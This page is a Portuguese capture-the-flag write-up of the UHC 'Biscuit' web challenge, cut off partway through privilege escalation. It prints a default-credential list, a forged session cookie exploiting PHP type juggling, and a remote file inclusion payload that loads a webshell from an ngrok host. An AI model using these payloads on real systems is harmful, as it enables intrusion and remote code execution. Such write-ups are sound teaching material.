<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>UHC - Biscuit - WEB</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }

.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }

.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }

.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }

.highlight-default {
}
.highlight-gray {
	color: rgb(155,154,151);
}
.highlight-brown {
	color: rgb(100,71,58);
}
.highlight-orange {
	color: rgb(217,115,13);
}
.highlight-yellow {
	color: rgb(223,171,1);
}
.highlight-teal {
	color: rgb(15,123,108);
}
.highlight-blue {
	color: rgb(11,110,153);
}
.highlight-purple {
	color: rgb(105,64,165);
}
.highlight-pink {
	color: rgb(173,26,114);
}
.highlight-red {
	color: rgb(224,62,62);
}
.highlight-gray_background {
	background: rgb(235,236,237);
}
.highlight-brown_background {
	background: rgb(233,229,227);
}
.highlight-orange_background {
	background: rgb(250,235,221);
}
.highlight-yellow_background {
	background: rgb(251,243,219);
}
.highlight-teal_background {
	background: rgb(221,237,234);
}
.highlight-blue_background {
	background: rgb(221,235,241);
}
.highlight-purple_background {
	background: rgb(234,228,242);
}
.highlight-pink_background {
	background: rgb(244,223,235);
}
.highlight-red_background {
	background: rgb(251,228,228);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(55, 53, 47, 0.6);
	fill: rgba(55, 53, 47, 0.6);
}
.block-color-brown {
	color: rgb(100,71,58);
	fill: rgb(100,71,58);
}
.block-color-orange {
	color: rgb(217,115,13);
	fill: rgb(217,115,13);
}
.block-color-yellow {
	color: rgb(223,171,1);
	fill: rgb(223,171,1);
}
.block-color-teal {
	color: rgb(15,123,108);
	fill: rgb(15,123,108);
}
.block-color-blue {
	color: rgb(11,110,153);
	fill: rgb(11,110,153);
}
.block-color-purple {
	color: rgb(105,64,165);
	fill: rgb(105,64,165);
}
.block-color-pink {
	color: rgb(173,26,114);
	fill: rgb(173,26,114);
}
.block-color-red {
	color: rgb(224,62,62);
	fill: rgb(224,62,62);
}
.block-color-gray_background {
	background: rgb(235,236,237);
}
.block-color-brown_background {
	background: rgb(233,229,227);
}
.block-color-orange_background {
	background: rgb(250,235,221);
}
.block-color-yellow_background {
	background: rgb(251,243,219);
}
.block-color-teal_background {
	background: rgb(221,237,234);
}
.block-color-blue_background {
	background: rgb(221,235,241);
}
.block-color-purple_background {
	background: rgb(234,228,242);
}
.block-color-pink_background {
	background: rgb(244,223,235);
}
.block-color-red_background {
	background: rgb(251,228,228);
}
.select-value-color-default { background-color: rgba(206,205,202,0.5); }
.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
.select-value-color-green { background-color: rgba(0,135,107,0.2); }
.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
.select-value-color-red { background-color: rgba(255,0,26,0.2); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="5e02bb55-0af5-44f0-adbb-dea8cc34fbf6" class="page sans"><header><img class="page-cover-image" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/2021-07-04_18-43.png" style="object-position:center 42.779999999999994%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">üß±</span></div><h1 class="page-title">UHC - Biscuit - WEB</h1><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesMultipleSelect"><path d="M4,3 C4,2.447715 4.447715,2 5,2 L12,2 C12.5523,2 13,2.447716 13,3 C13,3.55228 12.5523,4 12,4 L5,4 C4.447715,4 4,3.55228 4,3 Z M4,7 C4,6.447715 4.447715,6 5,6 L12,6 C12.5523,6 13,6.447716 13,7 C13,7.55228 12.5523,8 12,8 L5,8 C4.447715,8 4,7.55228 4,7 Z M4,11 C4,10.447715 4.447715,10 5,10 L12,10 C12.5523,10 13,10.447716 13,11 C13,11.55228 12.5523,12 12,12 L5,12 C4.447715,12 4,11.55228 4,11 Z M2,4 C1.44771525,4 1,3.55228475 1,3 C1,2.44771525 1.44771525,2 2,2 C2.55228475,2 3,2.44771525 3,3 C3,3.55228475 2.55228475,4 2,4 Z M2,8 C1.44771525,8 1,7.55228475 1,7 C1,6.44771525 1.44771525,6 2,6 C2.55228475,6 3,6.44771525 3,7 C3,7.55228475 2.55228475,8 2,8 Z M2,12 C1.44771525,12 1,11.5522847 1,11 C1,10.4477153 1.44771525,10 2,10 C2.55228475,10 3,10.4477153 3,11 C3,11.5522847 2.55228475,12 2,12 Z"></path></svg></span>vulns and exploitations</th><td><span class="selected-value select-value-color-green">LFI</span><span class="selected-value select-value-color-green">format string</span><span class="selected-value select-value-color-purple">local file inclusion</span><span class="selected-value select-value-color-red">python</span><span class="selected-value select-value-color-yellow">remote file inclusion</span><span class="selected-value select-value-color-pink">rfi</span><span class="selected-value select-value-color-default">type juggling</span></td></tr></tbody></table></header><div class="page-body"><p id="b3eb1be9-0867-431f-8b1a-a4d1b2733e3f" class="">Ola sou o Vinicius (big0us), esse √© um write-up de uma maquina que foi o challenge de uma das etapas classificat√≥rias do UHC.</p><p id="399bc817-4c9f-4953-b5b7-b06137c95938" class="">Escreverei meio r√°pido ent√£o pe√ßo desculpas se algo estiver um pouco ruim.</p><p id="ea32ef13-5dcd-4a3d-8c45-37ef49c6cad1" class="">Boa leitura :)</p><p id="91a1835e-7d97-4050-9d26-a258ba4099eb" class="">g00d_h4ck1ng</p><h2 id="05ee8729-a35c-4b14-8591-40b25c64842b" class="">Recon</h2><figure id="9382da6b-826e-480b-9030-094ee8ebd69c" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled.png"><img style="width:1366px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled.png"/></a></figure><p id="c35da3d5-075d-4041-a6ff-fd6dbc49538f" class="">A primeira p√°gina √© uma p√°gina de login, dando uma olhada no HTML da p√°gina aparentemente n√£o existe nada escondido, vou rodar um fuzzing e depois poderemos testar algumas credenciais.</p><figure id="2ea4fb4b-bae4-4c34-ae55-ca6f197c3028" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%201.png"><img style="width:764px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%201.png"/></a></figure><p id="14664a12-8789-42b3-89e1-963bf4aae035" class="">Aparentemente nosso fuzzing entregou apenas um /class, onde existe um directory listing apontando um arquivo &quot;.php&quot;.</p><figure id="fe31374e-887b-4d7d-ab94-32139a57ee17" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%202.png"><img style="width:403px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%202.png"/></a></figure><p id="986992b0-e1a4-4cc6-be5d-07aea713f033" class="">Ok, vamos testar algumas credenciais padr√µes no formul√°rio de login:</p><pre id="d1d777c0-447e-4920-82ba-bdd9b6944b1e" class="code"><code>admin:admin
guest:guest
administrator:admin
root:root</code></pre><p id="7a173dc5-3a29-4aa1-921b-0385bed7e19f" class="">Testando &quot;guest:guest&quot; conseguimos entrar:</p><figure id="9048b46c-ec93-4aad-b451-6b89bb6ef8b3" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%203.png"><img style="width:640px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%203.png"/></a></figure><p id="e279270c-8bbf-4613-9d0d-403606ce314b" class="">Dando uma olhada aparentemente temos s√≥ uma p√°gina de welcome.</p><p id="447e3fb3-7ffa-45ad-8ef8-ac4990ec7905" class="">Vamos ver nossos cookies.</p><figure id="58b63f68-0e9b-4ac7-882b-e97e3c6bc748" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%204.png"><img style="width:554px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%204.png"/></a></figure><p id="709e1d6f-6613-48bc-a485-adcf1e6b2197" class="">Vamos entender melhor esse cookie chamado session pois ele parece ser interessante:</p><figure id="d518d2ab-640a-48f4-ae69-7205cf81c81d" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%205.png"><img style="width:1094px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%205.png"/></a></figure><p id="a7d1e2b7-236c-4133-99fa-39dfe5b3b63f" class="">Utilizando o cyberchef para decodar o cookie podemos perceber que se trata de um JSON com tr√™s valores: hmac (provavelmente algo que valide os valores), username, e uma hora para o cookie expirar.</p><p id="1549b359-da55-4837-8d76-9e9c00aab2f6" class="">Vou tentar alterar o valor de username para &quot;admin&quot; encodar em base64, url e ent√£o enviar para a aplica√ß√£o.</p><figure id="c65cf606-ba86-43b1-9051-052931841912" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%206.png"><img style="width:807px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%206.png"/></a></figure><p id="d8529ef6-e3c2-4ac7-97fc-707dc6997230" class="">Aparentemente retornou um erro dizendo que estamos tentando fazer um &quot;temperamento de cookie&quot;, e retornou uma flag! Nossa primeira flag.</p><p id="dbd95226-70d4-4fdd-a9dd-f27189a1ad3d" class="">Depois de alguns testes enviando cookies com outros valores aleat√≥rios, acabei percebendo que a aplica√ß√£o valida o Cookie pelo valor do hmac, e n√£o pelo conteudo inteiro do json.</p><p id="e16bd0df-26b4-440d-b660-d02ab1dec4e4" class="">Uma vulnerabilidade muito conhecida sobre valida√ß√µes do PHP √© o type jugling, que consiste em bypass de autentica√ß√µes fazendo qualquer if($ == $) retornar &quot;true&quot;.</p><figure id="db328db8-fea6-4e0d-8be2-353b3235322e"><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">PHP Tricks (SPA)</div><div class="bookmark-description">&quot;0e12334&quot; == &quot;0&quot; --&gt; True This is very interesting because in some cases yo can control the string input of &quot;0&quot; and some content that is being hashed and compared to it. Therefore, if you can provide a value that will create a hash starting with &quot;0e&quot; and without any letter, you could bypass the comparison.</div></div><div class="bookmark-href"><img src="https://gblobscdn.gitbook.com/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Favatar.png?alt=media" class="icon bookmark-icon"/>https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp</div></div><img src="https://app.gitbook.com/share/space/thumbnail/-L_2uGJGU7AVNRcqRvEi.png" class="bookmark-image"/></a></figure><figure id="8c16db52-e021-40ef-aa5b-89949ecdf2a1"><a href="https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">PHP Type Juggling Vulnerabilities</div><div class="bookmark-description">Much like Python and Javascript, PHP is a dynamically typed language. This means that variable types are checked while the program is executing. Dynamic typing allows developers to be more flexible when using PHP. But this kind of flexibility sometimes causes unexpected...</div></div><div class="bookmark-href"><img src="https://miro.medium.com/1*m-R_BkNf1Qjr1YbyOIJY2w.png" class="icon bookmark-icon"/>https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09</div></div><img src="https://miro.medium.com/max/1200/1*coYi138tZjMKg-ZSQ-vuAQ.png" class="bookmark-image"/></a></figure><figure id="627ac623-472a-4b84-b5fe-3d5aedf669d6" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%207.png"><img style="width:624px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%207.png"/></a></figure><p id="c9e34c5c-7d51-463f-8120-dc9e4ba67fc2" class="">Basicamente quando um programador utiliza &quot;==&quot; em uma compara√ß√£o o php primeiro torna os dois valores do mesmo tipo, ignorando o tipo (int, str...) das vari√°veis.</p><p id="f1bf927a-86b3-415f-83ef-155b860a065f" class="">E nessa opera√ß√£o podemos utilizar algumas t√©cnicas para a compara√ß√£o retornar &quot;true&quot;.</p><h2 id="4f38ab25-f03a-4751-aea2-a906efeb2c26" class="">Exploitation</h2><p id="1f3cb5af-60e5-4cc2-8fd7-a7391b94fd14" class="">Depois de um tempo tentando, testei trocar o valor do &quot;hmac&quot; para &quot;true&quot; e aparentemente funcionou!</p><figure id="1b18f641-e927-4878-ac2b-fd67cce4e7c8" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%208.png"><img style="width:685px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%208.png"/></a></figure><pre id="34ab01b0-64a6-4820-83a6-ed6bf64181e5" class="code"><code>{&quot;hmac&quot;:true,&quot;username&quot;:&quot;admin&quot;,&quot;expiration&quot;:1625435484}</code></pre><figure id="94c56e69-e127-426f-982b-5a90e1a2f46b" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%209.png"><img style="width:427px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%209.png"/></a></figure><p id="3dae533a-560a-4a81-897c-061d598b1831" class="">Ok, fiquei triste que n√£o existe nenhuma flag por aqui üò¢.</p><p id="1aeaaf50-cebb-4c1b-be99-9203078c60cb" class="">Vou tentar alterar o nome do usu√°rio para entender o que est√° acontecendo.</p><p id="7fb0ff4e-de7e-4140-b6f0-893e7bb2f15d" class="">Alterando para &quot;test&quot; o php nos retorna um erro, aparentemente ele est√° rodando um &quot;require_once&quot; no valor que colocamos + adicionando .php no final. require_once normalmente √© usado para incluir p√°ginas e arquivos php em sites, e quando o usu√°rio tem controle sobre o valor que o require_once vai usar a aplica√ß√£o est√° vulner√°vel a LFI ou RFI (Local/Remote File Inclusion).</p><figure id="a5db9cf3-447c-458f-8998-abde37c5c02b" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2010.png"><img style="width:805px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2010.png"/></a></figure><p id="16afd329-9f59-4240-9746-472959a07730" class="">Como a aplica√ß√£o ja coloca o .php no final vou fazer o seguinte.</p><p id="34d39e51-6b2f-45da-a862-dc557ee9c489" class="">Subir um arquivo com uma webshell num servidor utilizando o ngrok, mandar a a aplica√ß√£o incluir meu arquivo e conseguir um RCE.</p><figure id="4e1b2f9c-d4c2-42fb-96c8-ab69a34a6f98" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2011.png"><img style="width:1287px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2011.png"/></a></figure><p id="d2d65ace-c221-4f52-bb2c-cfae381e7987" class="">E vou mandar a payload:</p><pre id="9298e5bc-0246-4a9a-a1b5-2f9547bc71f3" class="code"><code>{&quot;hmac&quot;:true,&quot;username&quot;:&quot;https://3b4f8afabab2.ngrok.io/shell&quot;,&quot;expiration&quot;:1625435484}</code></pre><p id="90dff8a8-07fa-417f-8dc7-439755435336" class="">(A aplica√ß√£o ja vai colocar o .php)</p><p id="cb7f7bb1-6a3f-483e-a5bc-cf2279f9a69e" class="">Temos RCE!!</p><figure id="43df674d-baa4-4b02-9f42-79928e57549a" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2012.png"><img style="width:452px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2012.png"/></a></figure><p id="283b0b13-49d4-4fb2-9d90-5fa7301bca44" class="">
</p><p id="4cd4c24d-9fed-429a-ba49-169a8d4eb75c" class="">Agora vou tentar pegar uma reverse shell.</p><p id="42954393-278c-4364-b465-eaee05d5fbb1" class="">Ap√≥s algumas tentativas percebi que existe um firewall na aplica√ß√£o que bloqueia qualquer comunica√ß√£o em portas que n√£o forem 80 ou 443, como eu n√£o tenho uma VPS, vou fazer de uma forma diferente, ao inv√©s de uma reverse shell (onde a vitima se conecta no atante) vou pegar uma bind shell (abrindo uma porta na maquina e me conectando nela).</p><p id="d2a3bbda-28d5-454d-a750-997207c882d1" class="">Para isso vou usar o &quot;socat&quot;.</p><figure id="539399b2-e6af-4909-91a9-2c7f457a408a"><a href="https://gtfobins.github.io/gtfobins/socat/#bind-shell" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">socat | GTFOBins</div><div class="bookmark-description">It can be used to break out from restricted environments by spawning an interactive system shell. It can send back a reverse shell to a listening attacker to open a remote network access. It can bind a shell to a local port to allow remote network access.</div></div><div class="bookmark-href"><img src="https://gtfobins.github.io/assets/logo.png" class="icon bookmark-icon"/>https://gtfobins.github.io/gtfobins/socat/#bind-shell</div></div></a></figure><figure id="147f3ba5-eedb-499d-a6b4-1266644a84d1" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2013.png"><img style="width:828px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2013.png"/></a></figure><p id="71823e14-ecd7-45a4-ab99-03f9d2090221" class="">Primeiro peguei o binario do socat no github deles (socat binary) e passei pra maquina utilizando o web-server que eu criei para conseguir RCE, e dando um curl.</p><p id="b409452d-8bae-4e14-82a5-247608a75958" class="">Ent√£o rodei os comandos que est√£o na imagem e consegui uma bind shell! (utilizei a porta 6969)</p><figure id="a90a738c-3a33-4f5c-bb3f-dda3bbc28028" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2014.png"><img style="width:691px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2014.png"/></a></figure><p id="62c87991-99de-4cd0-aee0-087dfd197e4f" class="">E navegando um pouco no / encontramos a pr√≥xima flag:</p><figure id="8035d423-8f96-41f2-8723-15cb6b4f39ad" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2015.png"><img style="width:600px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2015.png"/></a></figure><h2 id="abc7bc91-88ce-4e4c-b1b7-e26b4976d333" class="">P√≥s Exploitation</h2><p id="4a8affe1-dfe0-4e9c-8602-56d2849d3169" class="">Fazendo o b√°sico checklist de priv esc podemos perceber que estamos com o usu√°rio do apache e podemos rodar um script como root na m√°quina:</p><figure id="cce039d1-fac5-48f9-befa-b23938d5f13b" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2016.png"><img style="width:656px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2016.png"/></a></figure><p id="5b8fe987-a99d-47cb-875c-e9f6937c25ed" class="">Aparentemente n√£o podemos ler o script e nem altera-lo.</p><figure id="bec9480f-259b-41be-a053-47e50ac5619a" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2017.png"><img style="width:523px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2017.png"/></a></figure><p id="79e700bf-9f99-4603-801b-506135d49340" class="">O que nos resta √© roda-lo:</p><figure id="b9cd4952-48eb-41dd-934b-5efd7b829a2a" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2018.png"><img style="width:319px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2018.png"/></a></figure><p id="3be0fe8d-b36c-4c2e-9adb-c5b593296234" class="">Aparentemente ele printa um IP, dando uma olhada no /var/www/html o path da aplica√ß√£o web podemos perceber que existe um arquivo com o mesmo ip que ele printou, ent√£o aparentemente ele est√° printando o IP que est√° no arquivo.</p><figure 